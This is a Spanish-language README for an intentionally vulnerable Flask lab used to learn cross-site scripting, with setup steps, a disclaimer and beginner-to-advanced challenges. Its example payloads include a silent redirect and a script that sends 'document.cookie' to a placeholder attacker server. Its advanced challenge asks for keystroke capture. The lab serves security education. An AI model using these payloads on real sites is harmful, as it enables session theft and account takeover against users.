# [🛡️ XSS Lab Interactive]
[![XSS Lab Interactive](https://img.shields.io/badge/XSS%20Lab%20Interactive-Click%20here-green?style=for-the-badge&logo=python&color=red)](https://xsslabinteractive.pythonanywhere.com/)

*Plataforma colaborativa para aprender y practicar vulnerabilidades XSS de forma segura y controlada*

![GitHub license](https://img.shields.io/github/license/infernoidpl4y/XSSLab)  
![Python](https://img.shields.io/badge/Python-3.x-blue)  
![Flask](https://img.shields.io/badge/Flask-2.x-orange)  
![OWASP](https://img.shields.io/badge/OWASP-Top_10-red)  

---

## 🎯 ¿Qué es XSS Lab?
Un entorno de aprendizaje práctico para estudiantes y profesionales de ciberseguridad, diseñado para **entender y practicar la explotación de vulnerabilidades XSS (Cross-Site Scripting)** en un entorno seguro y controlado.

> "No es solo destruir... es entender cómo funciona la seguridad web"  
> - InfernoidPl4y

---

## 🔧 Características Principales
- ✅ **Vulnerable intencionalmente** para pruebas de seguridad  
- 📚 Entorno controlado para experimentación segura  
- 💬 Sistema de publicaciones con inyección XSS en campo de texto  
- 🎨 Ejemplo predefinido: `!inject` para payloads básicos  
- 📉 Datos reiniciados automáticamente cada 48 horas  
- 🌐 Desplegable en plataformas como PythonAnywhere  
- 🤝 Diseñado para aprendizaje comunitario

---

## 📦 Tecnologías Utilizadas
- 🐍 **Python** (Flask framework)
- 💻 **HTML/CSS** (Frontend interactivo)
- 🔐 Enfoque en OWASP Top 10 (XSS específicamente)

---

## 🚀 Instalación Local

### Requisitos:
- Python 3.x
- pip (Python Package Manager)

### Pasos:
```bash
# Clona el repositorio
git clone https://github.com/infernoidpl4y/XSSLab.git

# Accede al directorio
cd XSSLab

# Instala dependencias
pip install -r requirements.txt

# Ejecuta la aplicación
python app.py
```

---

## 🧪 Cómo Usarlo

1. Abre el navegador en `http://localhost:5000`
2. Crea una publicación con código XSS:
   ```html
   <script>alert('¡XSS básico!')</script>
   ```
3. **Ejemplo rápido:** Escribe `!inject` en el campo XSS para ver un payload predefinido
4. Observa el comportamiento y experimenta con diferentes payloads

---

## ⚠️ Aviso Importante
- **Solo para fines educativos**
- **No introduzcas información sensible**
- **Los datos se reinician periódicamente**

---

## 🧠 Ejemplos de Payloads para Pruebas

### Básico
```html
<script>alert('XSS')</script>
```

### Estilo Visual
```html
<style>
  body { background: red; transition: all 2s; }
</style>
```

### Redirección Silenciosa
```html
<script>window.location.href='https://example.com'</script>
```

### Captura de Cookies (Ejemplo académico)
```html
<script>
  fetch('https://tu-servidor.com/log?data='+document.cookie)
</script>
```

---

## 🧰 Desafíos Recomendados

### Nivel Principiante
- Crea una alerta que salte al cargar la página

### Nivel Intermedio
- Modifica el estilo de otra publicación

### Nivel Avanzado
- Inyecta un script que capture entradas del teclado

---

## 📸 Captura de Pantalla
![XSS Lab Demo](https://via.placeholder.com/800x500?text=XSS+Lab+Interactive+Demo)

---

## 🤝 Contribuciones
¡Las mejoras y contribuciones son bienvenidas!  
Por favor lee el [CONTRIBUTING.md](CONTRIBUTING.md) para más detalles.

---

## 📬 Contacto
InfernoidPl4y - infernoidpl4y@gmail.com  
Portfolio: [infernoidpl4y.netlify.app](https://infernoidpl4y.netlify.app)
